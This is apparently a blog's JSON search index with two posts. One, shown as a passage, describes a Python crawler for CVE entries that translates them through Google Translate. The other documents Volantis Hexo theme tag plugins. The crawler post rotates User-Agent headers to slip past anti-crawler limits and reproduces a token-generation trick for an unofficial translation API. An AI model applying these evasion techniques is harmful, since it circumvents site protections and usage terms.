在爬取的过程中总是存在“服务器长期未答应”或者“服务器强制关闭了此连接”的错误，猜测服务器存在反爬虫机制，因此是用来随机请求头的方式来建立简单地反反爬虫机制： 1&#39;User-Agent&#39;: choice(UAlist) 随机选择列表中的请求头，来迷惑服务器，减少请求数量达到服务器规定阀值的机会 确定使用的翻译接口截取漏洞网站的一段话分别放进百度翻译，有道翻译，google翻译，检测翻译的准确性，结果如下： 原话： 1234567891011A vulnerability in the web-based management interface of Cisco Identity Services Engine (ISE) could allow an unauthenticated, remote attacker to conduct a cross-site request forgery (CSRF) attack and perform arbitrary actions on an affected device. The vulnerability is due to insufficient CSRF protections for the web-based management interface of an affected device. An attacker could exploit this vulnerability by persuading a user of the interface to follow a crafted link. A successful exploit could allow the attacker to perform arbitraryactions on a targeted device via a web browser and with the privileges of the user. Cisco Bug IDs: CSCvi85159. 百度翻译： 1234567Cisco Identity Services Engine(ISE)的基于网络的管理接口中的漏洞可能允许未经身份验证的远程攻击者进行跨站点请求伪造(CSRF)攻击并在受影响的设备上执行任意操作。该漏洞是由于受影响设备的基于网络的管理接口没有足够的CSRF保护造成的。攻击者可以通过说服接口的用户遵循精心编制的链接来利用此漏洞。成功利用此漏洞可使攻击者通过Web浏览器并以用户的权限在目标设备上执行任意操作。CiscoBugID：CSCvi85159。 有道翻译： 1234567Cisco Identity Services Engine (ISE)基于web的管理界面中的一个漏洞可能允许未经身份验证的远程攻击者进行跨站点请求伪造(cross-site request forgery, CSRF)攻击，并在受影响的设备上执行任意操作。该漏洞是由于受影响设备的基于web的管理界面的CSRF保护不足造成的。攻击者可以通过说服界面用户遵循精心设计的链接来利用这个漏洞。一个成功的攻击可以允许攻击者通过web浏览器和用户的特权在目标设备上执行任意操作。Cisco Bug id: CSCvi85159。 google翻译： 12345思科身份服务引擎（ISE）基于Web的管理界面中的漏洞可能允许未经身份验证的远程攻击者进行跨站点请求伪造（CSRF）攻击并在受影响的设备上执行任意操作。 该漏洞是由于受影响设备的基于Web的管理界面的CSRF保护不足。 攻击者可以通过说服界面的用户遵循精心设计的链接来利用此漏洞。成功利用可以允许攻击者通过Web浏览器并使用用户的权限在目标设备上执行任意操作。 思科Bug ID：CSCvi85159。 通过以上结果发现google翻译最贴切实意，因此确定使用google翻译 发现并使用google翻译接口首先发现url是： 1234567891011121314151617https:&#x2F;&#x2F;translate.google.cn&#x2F;#view&#x3D;home&amp;op&#x3D;translate&amp;sl&#x3D;en&amp;tl&#x3D;zh-CN&amp;text&#x3D;A%20vulnerability%20in%20the%20web-based%20management%20interface%20of%20Cisco%20Identity%20Services%20Engine%20(ISE)%20could%20allow%20an%20unauthenticated%2C%20remote%20attacker%20to%20conduct%20a%20cross-site%20request%20forgery%20(CSRF)%20attack%20and%20perform%20arbitrary%20actions%20on%20an%20affected%20device.%20The%20vulnerability%20is%20due%20to%20insufficient%20CSRF%20protections%20for%20the%20web-based%20management%20interface%20of%20an%20affected%20device.%20An%20attacker%20could%20exploit%20this%20vulnerability%20by%20persuading%20a%20user%20of%20the%20interface%20to%20follow%20a%20crafted%20link.%20A%20successful%20exploit%20could%20allow%20the%20attacker%20to%20perform%20arbitrary%20actions%20on%20a%20targeted%20device%20via%20a%20web%20browser%20and%20with%20the%20privileges%20of%20the%20user.%20Cisco%20Bug%20IDs%3A%20CSCvi85159. 很容易发现url中带有我们所要翻译的句子，然后也准备好了可以筛选出翻译部分的xpath规则，但运行程序后发现总是返回空集。后来查看网页源代码后发现源代码中确实没有翻译的内容，所以推测他是使用某种神秘手段显示。 然后观察浏览器与服务器的通信发现每次他都会和一个网址发起请求，并且网址会返回以列表嵌套的方式返回翻译内容，翻译状况等信息： 123456789101112131415161718192021https:&#x2F;&#x2F;translate.google.cn&#x2F;translate_a&#x2F;single?client&#x3D;webapp&amp;sl&#x3D;en&amp;tl&#x3D;zh-CN&amp;hl&#x3D;zh-CN&amp;dt&#x3D;at&amp;dt&#x3D;bd&amp;dt&#x3D;ex&amp;dt&#x3D;ld&amp;dt&#x3D;md&amp;dt&#x3D;qca&amp;dt&#x3D;rw&amp;dt&#x3D;rm&amp;dt&#x3D;ss&amp;dt&#x3D;t&amp;otf&#x3D;1&amp;ssel&#x3D;0&amp;tsel&#x3D;0&amp;kc&#x3D;2&amp;tk&#x3D;831447.664573&amp;q&#x3D;A%20vulnerability%20in%20the%20web-based%20management%20interface%20of%20Cisco%20Identity%20Services%20Engine%20(ISE)%20could%20allow%20an%20unauthenticated%2C%20remote%20attacker%20to%20conduct%20a%20cross-site%20request%20forgery%20(CSRF)%20attack%20and%20perform%20arbitrary%20actions%20on%20an%20affected%20device.%20The%20vulnerability%20is%20due%20to%20insufficient%20CSRF%20protections%20for%20the%20web-based%20management%20interface%20of%20an%20affected%20device.%20An%20attacker%20could%20exploit%20thivulnerability%20by%20persuading%20a%20user%20of%20the%20interface%20to%20follow%20a%20crafted%20link.%20A%20successful%20exploit%20could%20allow%20the%20attacker%20to%20perform%20arbitrary%20actions%20on%20a%20targeted%20device%20via%20a%20web%20browser%20and%20with%20the%20privileges%20of%20the%20user.%20Cisco%20Bug%20IDs%3A%20CSCvi85159. 浏览器以GET方式发出请求并携带了几个参数： 123456789101112131415161718192021222324baseUrl=&#x27;https://translate.google.cn/translate_a/single&#x27;baseUrl+=&#x27;?client=t&amp;&#x27;baseUrl+=&#x27;s1=auto&amp;&#x27;baseUrl+=&#x27;t1=zh-CN&amp;&#x27;baseUrl+=&#x27;h1=zh-CN&amp;&#x27;baseUrl+=&#x27;dt=at&amp;&#x27;baseUrl+=&#x27;dt=bd&amp;&#x27;baseUrl+=&#x27;dt=ex&amp;&#x27;baseUrl+=&#x27;dt=ld&amp;&#x27;baseUrl+=&#x27;dt=md&amp;&#x27;baseUrl+=&#x27;dt=qca&amp;&#x27;baseUrl+=&#x27;dt=rw&amp;&#x27;baseUrl+=&#x27;dt=rm&amp;&#x27;baseUrl+=&#x27;dt=ss&amp;&#x27;baseUrl+=&#x27;dt=t&amp;&#x27;baseUrl+=&#x27;ie=UTF-8&amp;&#x27;baseUrl+=&#x27;oe=UTF-8&amp;&#x27;baseUrl+=&#x27;otf=1&amp;&#x27;baseUrl+=&#x27;pc=1&amp;&#x27;baseUrl+=&#x27;ssel=0&amp;&#x27;baseUrl+=&#x27;tsel=0&amp;&#x27;baseUrl+=&#x27;kc=2&amp;&#x27;baseUrl+=&#x27;tk=831447.664573&amp;&#x27;baseUrl+=&#x27;q=&#x27;+text 利用代码，拼接好url后请求发现他只能翻译那句话，其他话返回403界面。然后通过尝试发现改变tk参数后，那句话也没办法翻译了，因此推测tk是一个请求服务的关键参数。 通过百度后发现有人已经写出了这个密钥的生成原理，利用他的生成原理果然可以返回正确的结果，然后把这个功能进行了分装，然后在需要翻译的地方进行了调用。 提高代码的灵活性增加了用户输入接口，让用户有选择的余地，可以根据自己的需求灵活的自定义参数： 12345678910111213141516171819202122232425def main(): while 1: year = int(input(&quot;你想爬哪年的CVE?(1988-2018)&quot;)) if year &gt;= 1988 and year &lt;= 2018: break else: print(&quot;请重新输入&quot;) while 1: month = int(input(&quot;你想爬哪年的CVE?(1-12)&quot;)) if month &gt;= 1 and month &lt;= 12: break else: print(&quot;请重新输入&quot;) while 1: mod = int(input(&quot;是否保存数据到本地?\\n1 保存\\n2 不保存&quot;)) if mod == 1 or mod == 2: break else: print(&quot;请重新输入&quot;) CVEs = fun.getCVEs(year,month) details = fun.getDetails(CVEs) if mod == 1: write(details) else: show(details)","categories":[{"name":"编程","slug":"编程","permalink":"https://canc3s.github.io/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"python","slug":"python","permalink":"https://canc3s.github.io/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"https://canc3s.github.io/tags/%E7%88%AC%E8%99%AB/"},{"name":"CVE","slug":"CVE","permalink":"https://canc3s.github.io/tags/CVE/"}]},{"title":"标签插件","slug":"标签插件","date":"2018-01-03T15:30:04.000Z","updated":"2021-01-30T15:38:19.250Z","comments":true,"path":"2018/01/03/","link":"","permalink":"https://canc3s.github.io/2018/01/03/","excerpt":"","text":"为了兼容老用户，旧的标签插件在重构之前依然沿用旧的格式，即「英文逗号+空格」作为参数分隔符，而部分新增标签插件是「空格+英文竖线+空格」，请注意区分。 我们也在探索哪种分隔符既简单又不容易引起冲突，所以可能存在多种格式，具体以对应文档描述为准。 text这是一些文本样式标签： 带 下划线 的文本 example.md:1带 &#123;% u 下划线 %&#125; 的文本 带 着重号 的文本 example.md:1带 &#123;% emp 着重号 %&#125; 的文本 带 波浪线 的文本 example.md:1带 &#123;% wavy 波浪线 %&#125; 的文本 带 删除线 的文本 example.md:1带 &#123;% del 删除线 %&#125; 的文本 键盘样式的文本 command + D example.md:1键盘样式的文本 &#123;% kbd command %&#125; + &#123;% kbd D %&#125; 密码样式的文本：这里没有验证码 example.md:1密码样式的文本：&#123;% psw 这里没有验证码 %&#125; span本插件最后更新于 2.5 版本1&#123;% span 样式参数, 文本内容 %&#125; 彩色文字在一段话中方便插入各种颜色的标签，包括：红色、黄色、绿色、青色、蓝色、灰色。 超大号文字文档「开始」页面中的标题部分就是超大号文字。 Volantis A Wonderful Theme for Hexo 上述示例的源码example:12345678910#### 彩色文字在一段话中方便插入各种颜色的标签，包括：&#123;% span red, 红色 %&#125;、&#123;% span yellow, 黄色 %&#125;、&#123;% span green, 绿色 %&#125;、&#123;% span cyan, 青色 %&#125;、&#123;% span blue, 蓝色 %&#125;、&#123;% span gray, 灰色 %&#125;。#### 超大号文字文档「开始」页面中的标题部分就是超大号文字。&#123;% span center logo large, Volantis %&#125;&#123;% span center small, A Wonderful Theme for Hexo %&#125; 可以支持的参数样式参数位置可以写颜色、大小和对齐方向，多个样式参数用空格隔开。 字体1logo, code 颜色1red, yellow, green, cyan, blue, gray 大小1small, h4, h3, h2, h1, large, huge, ultra 对齐方向1left, center, right p本插件最后更新于 2.5 版本1&#123;% p 样式参数, 文本内容 %&#125; 演示效果彩色文字在一段话中方便插入各种颜色的标签，包括：红色、黄色、绿色、青色、蓝色、灰色。 超大号文字文档「开始」页面中的标题部分就是超大号文字。 Volantis A Wonderful Theme for Hexo 上述示例的源码example:12345678910#### 彩色文字在一段话中方便插入各种颜色的标签，包括：&#123;% p red, 红色 %&#125;、&#123;% p yellow, 黄色 %&#125;、&#123;% p green, 绿色 %&#125;、&#123;% p cyan, 青色 %&#125;、&#123;% p blue, 蓝色 %&#125;、&#123;% p gray, 灰色 %&#125;。#### 超大号文字文档「开始」页面中的标题部分就是超大号文字。&#123;% p center logo large, Volantis %&#125;&#123;% p center small, A Wonderful Theme for Hexo %&#125; 可以支持的参数样式参数位置可以写颜色、大小和对齐方向，多个样式参数用空格隔开。 字体1logo, code 颜色1red, yellow, green, cyan, blue, gray 大小1small, h4, h3, h2, h1, large, huge, ultra 对齐方向1left, center, right noteNoteBlock 是 Blockquote 的增强版，在左边显示图标，并且可以自定颜色。而 Note 是 NoteBlock 的简便写法。 最后更新于 2.3 版本1&#123;% note 样式参数, 文本内容 %&#125; 演示效果经典用法可以在配置文件中设置默认样式，为简单的一句话提供最的简便写法。 note quote 适合引用一段话 note info 默认主题色，适合中性的信息 note warning 默认黄色，适合警告性的信息 note error/danger 默认红色，适合危险性的信息 note done/success 默认绿色，适合正确操作的信息 更多图标这些都是默认样式，可以手动加上颜色： note radiation 默认样式 note radiation yellow 可以加上颜色 note bug red 说明还存在的一些故障 note link green 可以放置一些链接 note paperclip blue 放置一些附件链接 note todo 待办事项 note guide clear 可以加上一段向导 note download 可以放置下载链接 note message gray 一段消息 note up 可以说明如何进行更新 note undo light 可以说明如何撤销或者回退 上述示例的源码example:123456789101112131415161718192021222324#### 经典用法&#123;% note, 可以在配置文件中设置默认样式，为简单的一句话提供最的简便写法。 %&#125;&#123;% note quote, note quote 适合引用一段话 %&#125;&#123;% note info, note info 默认主题色，适合中性的信息 %&#125;&#123;% note warning, note warning 默认黄色，适合警告性的信息 %&#125;&#123;% note danger, note error/danger 默认红色，适合危险性的信息 %&#125;&#123;% note success, note done/success 默认绿色，适合正确操作的信息 %&#125;#### 更多图标这些都是默认样式，可以手动加上颜色：&#123;% note radiation, note radiation 默认样式 %&#125;&#123;% note radiation yellow, note radiation yellow 可以加上颜色 %&#125;&#123;% note bug red, note bug red 说明还存在的一些故障 %&#125;&#123;% note link green, note link green 可以放置一些链接 %&#125;&#123;% note paperclip blue, note paperclip blue 放置一些附件链接 %&#125;&#123;% note todo, note todo 待办事项 %&#125;&#123;% note guide clear, note guide clear 可以加上一段向导 %&#125;&#123;% note download, note download 可以放置下载链接 %&#125;&#123;% note message gray, note message gray 一段消息 %&#125;&#123;% note up, note up 可以说明如何进行更新 %&#125;&#123;% note undo light, note undo light 可以说明如何撤销或者回退 %&#125; 可以支持的参数样式参数位置可以写图标和颜色，多个样式参数用空格隔开。 图标彩色的1quote, info, warning, done/success, error/danger 灰色的，也可以指定颜色1radiation, bug, idea, link, paperclip, todo, message, guide, download, up, undo 颜色指定颜色1clear, light, gray, red, yellow, green, cyan, blue noteblockNoteBlock 是 Blockquote 的增强版，在左边显示图标，并且可以自定颜色。而 Note 是 NoteBlock 的简便写法。 最后更新于 4.0 版本123&#123;% noteblock 样式参数（可选）, 标题（可选） %&#125;文本段落&#123;% endnoteblock %&#125; 演示效果可以在区块中放置一些复杂的结构，支持嵌套。 标题（可选）Windows 10不是為所有人設計,而是為每個人設計嵌套测试： 请坐和放宽，我正在帮你搞定一切… Folding 测试： 点击查看更多 不要说我们没有警告过你我们都有不顺利的时候 上述示例的源码example:1234567891011121314151617&#123;% noteblock, 标题（可选） %&#125;Windows 10不是為所有人設計,而是為每個人設計&#123;% noteblock done %&#125;嵌套测试： 请坐和放宽，我正在帮你搞定一切...&#123;% endnoteblock %&#125;&#123;% folding yellow, Folding 测试： 点击查看更多 %&#125;&#123;% note warning, 不要说我们没有警告过你 %&#125;&#123;% noteblock bug red %&#125;我们都有不顺利的时候&#123;% endnoteblock %&#125;&#123;% endfolding %&#125;&#123;% endnoteblock %&#125; 可以支持的参数样式参数位置可以写图标和颜色，多个样式参数用空格隔开。 图标彩色的1quote, info, warning, done/success, error/danger 灰色的，也可以指定颜色1radiation, bug, idea, link, paperclip, todo, message, guide, download, up, undo 颜色指定颜色1clear, light, gray, red, yellow, green, cyan, blue checkbox最后更新于 2.6 版本1&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125; 演示效果 纯文本测试 支持简单的 markdown 语法 支持自定义颜色 绿色 + 默认选中 黄色 + 默认选中 青色 + 默认选中 蓝色 + 默认选中 增加 减少 叉 上述示例的源码example:12345678910&#123;% checkbox 纯文本测试 %&#125;&#123;% checkbox checked, 支持简单的 [markdown](https://guides.github.com/features/mastering-markdown/) 语法 %&#125;&#123;% checkbox red, 支持自定义颜色 %&#125;&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;&#123;% checkbox plus green checked, 增加 %&#125;&#123;% checkbox minus yellow checked, 减少 %&#125;&#123;% checkbox times red checked, 叉 %&#125; 可以支持的参数颜色1red, yellow, green, cyan, blue 样式1plus, minus, times 选中状态1checked radio最后更新于 2.6 版本1&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125; 演示效果 纯文本测试 支持简单的 markdown 语法 支持自定义颜色 绿色 黄色 青色 蓝色 上述示例的源码example:1234567&#123;% radio 纯文本测试 %&#125;&#123;% radio checked, 支持简单的 [markdown](https://guides.github.com/features/mastering-markdown/) 语法 %&#125;&#123;% radio red, 支持自定义颜色 %&#125;&#123;% radio green, 绿色 %&#125;&#123;% radio yellow, 黄色 %&#125;&#123;% radio cyan, 青色 %&#125;&#123;% radio blue, 蓝色 %&#125; 可以支持的参数颜色1red, yellow, green, cyan, blue 选中状态1checked timeline最后更新于 3.0 版本123456789101112131415&#123;% timeline 时间线标题（可选） %&#125;&#123;% timenode 时间节点（标题） %&#125;正文内容&#123;% endtimenode %&#125;&#123;% timenode 时间节点（标题） %&#125;正文内容&#123;% endtimenode %&#125;&#123;% endtimeline %&#125; 演示效果 2020-07-24 2.6.6 -&gt; 3.0 如果有 hexo-lazyload-image 插件，需要删除并重新安装最新版本，设置 lazyload.isSPA: true。2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 use_cdn: true 则需要删除。2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。2.x 版本的置顶 top: true 改为了 pin: true，并且同样适用于 layout: page 的页面。如果使用了 hexo-offline 插件，建议卸载，3.0 版本默认开启了 pjax 服务。 2020-05-15 2.6.3 -&gt; 2.6.6 不需要额外处理。 2020-04-20 2.6.2 -&gt; 2.6.3 全局搜索 seotitle 并替换为 seo_title。group 组件的索引规则有变，使用 group 组件的文章内，group: group_name 对应的组件名必须是 group_name。group 组件的列表名优先显示文章的 short_title 其次是 title。 上述示例的源码example:123456789101112131415161718192021222324252627&#123;% timeline %&#125;&#123;% timenode 2020-07-24 [2.6.6 -&gt; 3.0](https://github.com/volantis-x/hexo-theme-volantis/releases) %&#125;1. 如果有 `hexo-lazyload-image` 插件，需要删除并重新安装最新版本，设置 `lazyload.isSPA: true`。2. 2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 `use_cdn: true` 则需要删除。3. 2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。4. 2.x 版本的置顶 `top: true` 改为了 `pin: true`，并且同样适用于 `layout: page` 的页面。5. 如果使用了 `hexo-offline` 插件，建议卸载，3.0 版本默认开启了 pjax 服务。&#123;% endtimenode %&#125;&#123;% timenode 2020-05-15 [2.6.3 -&gt; 2.6.6](https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6) %&#125;不需要额外处理。&#123;% endtimenode %&#125;&#123;% timenode 2020-04-20 [2.6.2 -&gt; 2.6.3](https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3) %&#125;1. 全局搜索 `seotitle` 并替换为 `seo_title`。2. group 组件的索引规则有变，使用 group 组件的文章内，`group: group_name` 对应的组件名必须是 `group_name`。2. group 组件的列表名优先显示文章的 `short_title` 其次是 `title`。&#123;% endtimenode %&#125;&#123;% endtimeline %&#125; link最后更新于 3.0 版本1&#123;% link 标题, 链接, 图片链接（可选） %&#125; 演示效果如何参与项目https://volantis.js.org/contributors/ 上述示例的源码example:1&#123;% link 如何参与项目, https://volantis.js.org/contributors/, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png %&#125; button这个页面的标签将会在不久后重构 基础按钮请将您的 Volantis 升级至 2.4 版本以上使用。 语法格式参数列表示例写法示例效果1&#123;% btn 样式参数（可选）, 标题, 链接, 图标（可选） %&#125; 可选的参数可以省略，但是前后顺序不能乱。样式参数 1regular, large, center 图标 第1个或者第2个参数包含 fa- 的那个被识别为图标。example.md:123456789不设置任何参数的 &#123;% btn 按钮, / %&#125; 适合融入段落中。regular 按钮适合独立于段落之外：&#123;% btn regular, 示例博客, https://xaoxuu.com, fas fa-play-circle %&#125;large 按钮更具有强调作用，建议搭配 center 使用：&#123;% btn center large, 开始使用, https://volantis.js.org/v3/getting-started/, fas fa-download %&#125;行内按钮 不设置任何参数的 按钮 适合融入段落中。 空心按钮 示例博客 示例博客 示例博客 示例博客 居中： 开始使用 实心按钮 示例博客 示例博客 示例博客 示例博客 居中： 开始使用 富文本按钮请将您的 Volantis 升级至 2.3 版本以上使用。 语法格式参数列表示例写法示例效果1234&#123;% btns 样式参数 %&#125;&#123;% cell 标题, 链接, 图片或者图标 %&#125;&#123;% cell 标题, 链接, 图片或者图标 %&#125;&#123;% endbtns %&#125;样式参数位置可以写图片样式、布局方式，多个样式参数用空格隔开。 圆角样式 默认为方形 1rounded, circle 布局方式 默认为自动宽度，适合视野内只有一两个的情况。 参数 含义 wide 宽一点的按钮 fill 填充布局，自动铺满至少一行，多了会换行。 center 居中，按钮之间是固定间距。 around 居中分散 grid2 等宽最多2列，屏幕变窄会适当减少列数。 grid3 等宽最多3列，屏幕变窄会适当减少列数。 grid4 等宽最多4列，屏幕变窄会适当减少列数。 grid5 等宽最多5列，屏幕变窄会适当减少列数。 增加文字样式 可以在容器内增加 &lt;b&gt;标题&lt;/b&gt; 和 &lt;p&gt;描述文字&lt;/p&gt;如果需要显示类似「团队成员」之类的一组含有头像的链接： example.md:1234567&#123;% btns circle grid5 %&#125;&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;&#123;% endbtns %&#125; 或者含有图标的按钮： example.md:1234&#123;% btns rounded grid5 %&#125;&#123;% cell 下载源码, /, fas fa-download %&#125;&#123;% cell 查看文档, /, fas fa-book-open %&#125;&#123;% endbtns %&#125; 圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中 example.md:1234567891011121314&#123;% btns circle center grid5 %&#125;&lt;a href=&#x27;https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1&#x27;&gt; &lt;i class=&#x27;fab fa-apple&#x27;&gt;&lt;/i&gt; &lt;b&gt;心率管家&lt;/b&gt; &#123;% p red, 专业版 %&#125; &lt;img src=&#x27;https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/qrcode/heartmate_pro.png&#x27;&gt;&lt;/a&gt;&lt;a href=&#x27;https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1&#x27;&gt; &lt;i class=&#x27;fab fa-apple&#x27;&gt;&lt;/i&gt; &lt;b&gt;心率管家&lt;/b&gt; &#123;% p green, 免费版 %&#125; &lt;img src=&#x27;https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/qrcode/heartmate_lite.png&#x27;&gt;&lt;/a&gt;&#123;% endbtns %&#125;如果需要显示类似「团队成员」之类的一组含有头像的链接： xaoxuu xaoxuu xaoxuu xaoxuu xaoxuu 或者含有图标的按钮： 下载源码 查看文档 圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中 心率管家 专业版 心率管家 免费版 ghcard最后更新于 4.0 版本12&#123;% ghcard 用户名, 其它参数（可选） %&#125;&#123;% ghcard 用户名/仓库, 其它参数（可选） %&#125; 用户信息卡片 上述示例的源码： example:12345| &#123;% ghcard xaoxuu %&#125; | &#123;% ghcard xaoxuu, theme=vue %&#125; || -- | -- || &#123;% ghcard xaoxuu, theme=buefy %&#125; | &#123;% ghcard xaoxuu, theme=solarized-light %&#125; || &#123;% ghcard xaoxuu, theme=onedark %&#125; | &#123;% ghcard xaoxuu, theme=solarized-dark %&#125; || &#123;% ghcard xaoxuu, theme=algolia %&#125; | &#123;% ghcard xaoxuu, theme=calm %&#125; | 仓库信息卡片 上述示例的源码： example:12345| &#123;% ghcard volantis-x/hexo-theme-volantis %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=vue %&#125; || -- | -- || &#123;% ghcard volantis-x/hexo-theme-volantis, theme=buefy %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-light %&#125; || &#123;% ghcard volantis-x/hexo-theme-volantis, theme=onedark %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-dark %&#125; || &#123;% ghcard volantis-x/hexo-theme-volantis, theme=algolia %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=calm %&#125; | 更多参数选择GitHub 卡片 API 参数https://github-readme-stats.vercel.app site最后更新于 4.0 版本1234&#123;% sitegroup %&#125;&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;&#123;% endsitegroup %&#125; 演示效果xaoxuu简约风格 inkss这是一段关于这个网站的描述文字 MHuiG这是一段关于这个网站的描述文字 Colsrch这是一段关于这个网站的描述文字 Linhk1606这是一段关于这个网站的描述文字 上述示例的源码example:1234567&#123;% sitegroup %&#125;&#123;% site xaoxuu, url=https://xaoxuu.com, screenshot=https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg, avatar=https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png, description=简约风格 %&#125;&#123;% site inkss, url=https://inkss.cn, screenshot=https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg, avatar=https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;&#123;% site MHuiG, url=https://blog.mhuig.top, screenshot=https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png, avatar=https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png, description=这是一段关于这个网站的描述文字 %&#125;&#123;% site Colsrch, url=https://colsrch.top, screenshot=https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png, avatar=https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;&#123;% site Linhk1606, url=https://linhk1606.github.io, screenshot=https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png, avatar=https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png, description=这是一段关于这个网站的描述文字 %&#125;&#123;% endsitegroup %&#125; dropmenu这个页面的标签将会在不久后重构 下拉菜单请将您的 Volantis 升级至 3.0 版本以上使用。 语法格式示例写法示例效果容器 123&#123;% menu 前缀（可省略）, 标题, 后缀（可省略） %&#125;菜单内容&#123;% endmenu %&#125; 菜单内容 菜单项 1&#123;% menuitem 文本, 链接, 图标 %&#125; 分割线 1&#123;% menuitem hr %&#125; 子菜单 123&#123;% submenu 嵌套菜单, 图标 %&#125;菜单内容&#123;% endsubmenu %&#125;示例1 12345678910&#123;% menu 下拉菜单 %&#125;&#123;% menuitem 主题源码, https://github.com/volantis-x/hexo-theme-volantis/, fas fa-file-code %&#125;&#123;% menuitem 更新日志, https://github.com/volantis-x/hexo-theme-volantis/releases/, fas fa-clipboard-list %&#125;&#123;% menuitem hr %&#125;&#123;% submenu 有疑问？, fas fa-question-circle %&#125;&#123;% menuitem 看 FAQ, /faqs/ %&#125;&#123;% menuitem 看 本站源码, https://github.com/volantis-x/volantis-docs/ %&#125;&#123;% menuitem 提 Issue, https://github.com/volantis-x/hexo-theme-volantis/issues/ %&#125;&#123;% endsubmenu %&#125;&#123;% endmenu %&#125; 示例2 123&#123;% menu 这个是, 下拉菜单 %&#125;（同上）&#123;% endmenu %&#125; 示例3 123&#123;% menu 这个是, 下拉菜单, 的示例效果。 %&#125;（同上）&#123;% endmenu %&#125;示例1 下拉菜单 主题源码 更新日志 有疑问？ 看 FAQ 看 本站源码 提 Issue 示例2 这个是 下拉菜单 主题源码 更新日志 有疑问？ 看 FAQ 看 本站源码 提 Issue 示例3 这个是 下拉菜单 主题源码 更新日志 有疑问？ 看 FAQ 看 本站源码 提 Issue 的示例效果。 tab此插件移植自 NexT #tabs 最后更新于 2.1 版本12345678&#123;% tabs 页面内不重复的ID %&#125;&lt;!-- tab 栏目1 --&gt;内容&lt;!-- endtab --&gt;&lt;!-- tab 栏目2 --&gt;内容&lt;!-- endtab --&gt;&#123;% endtabs %&#125; 演示效果栏目1栏目2。。。！！！ 上述示例的源码example:123456789101112131415&#123;% tabs tab-id %&#125;&lt;!-- tab 栏目1 --&gt;。。。&lt;!-- endtab --&gt;&lt;!-- tab 栏目2 --&gt;！！！&lt;!-- endtab --&gt;&#123;% endtabs %&#125; folding最后更新于 2.3 版本123&#123;% folding 参数（可选）, 标题 %&#125;![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg)&#123;% endfolding %&#125; 演示效果 查看图片测试 查看默认打开的折叠框 这是一个默认打开的折叠框。 查看代码测试 12345&#123;% folding green, 查看代码测试 %&#125;查看代码测试&#123;% endfolding %&#125; 查看列表测试 hahahehe 查看嵌套测试 查看嵌套测试2 查看嵌套测试3 hahaha 上述示例的源码example:123456789101112131415161718192021222324252627282930313233343536&#123;% folding 查看图片测试 %&#125;![](https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg)&#123;% endfolding %&#125;&#123;% folding cyan open, 查看默认打开的折叠框 %&#125;这是一个默认打开的折叠框。&#123;% endfolding %&#125;&#123;% folding green, 查看代码测试 %&#125;&#123;% endfolding %&#125;&#123;% folding yellow, 查看列表测试 %&#125;- haha- hehe&#123;% endfolding %&#125;&#123;% folding red, 查看嵌套测试 %&#125;&#123;% folding blue, 查看嵌套测试2 %&#125;&#123;% folding 查看嵌套测试3 %&#125;hahaha &lt;span&gt;&lt;img src=&#x27;https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png&#x27; style=&#x27;height:24px&#x27;&gt;&lt;/span&gt;&#123;% endfolding %&#125;&#123;% endfolding %&#125;&#123;% endfolding %&#125; 